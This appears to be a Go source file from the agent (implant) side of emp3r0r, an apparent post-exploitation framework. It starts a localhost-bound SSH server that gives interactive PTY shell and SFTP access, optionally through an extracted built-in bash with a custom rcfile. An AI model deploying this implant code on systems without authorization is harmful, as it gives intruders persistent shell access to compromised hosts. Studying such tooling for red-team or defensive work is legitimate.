package agent

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func setWinsize(f *os.File, w, h int) {
	syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), uintptr(syscall.TIOCSWINSZ),
		uintptr(unsafe.Pointer(&struct{ h, w, x, y uint16 }{uint16(h), uint16(w), 0, 0})))
}

// SSHD start a ssh server to provide shell access for clients
// the server binds local interface only
func crossPlatformSSHD(shell, port string, args []string) (err error) {
	exe, err := exec.LookPath(shell)
	if err != nil {
		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
		log.Print(res)
		return
	}
	ssh_server := ssh.Server{
		Addr: "127.0.0.1:" + port,
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
	}

	ssh_server.Handle(func(s ssh.Session) {
		cmd := exec.Command(exe, args...)
		if shell == "bash" && emp3r0r_data.DefaultShell != "/bin/sh" {
			err = ExtractBash()
			if err != nil {
				log.Printf("sshd: extract built-in bash: %v", err)
			}
			cmd = exec.Command(emp3r0r_data.DefaultShell, "--rcfile", RuntimeConfig.UtilsPath+"/.bashrc")
		}
		cmd.Env = append(cmd.Env, os.Environ()...)
		log.Printf("sshd execute: %s %v, env=%s", exe, args, cmd.Env)

		ptyReq, winCh, isPTY := s.Pty()
		if isPTY {
			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		} else {
			log.Print("Got an SSH request")
		}
		f, err := pty.Start(cmd)
		if err != nil {
			err = fmt.Errorf("Start PTY: %v", err)
			io.WriteString(s, err.Error())
			return
		}
		go func() {
			for win := range winCh {
				setWinsize(f, win.Width, win.Height)
			}
		}()
		go func() {
			defer func() {
				f.Close()
				if cmd.Process != nil {
					cmd.Process.Kill()
				}
			}()
			io.Copy(f, s) // stdin
		}()
		io.Copy(s, f) // stdout
		cmd.Wait()
	})

	log.Printf("Starting SSHD on port %s...", port)
	return ssh_server.ListenAndServe()
}
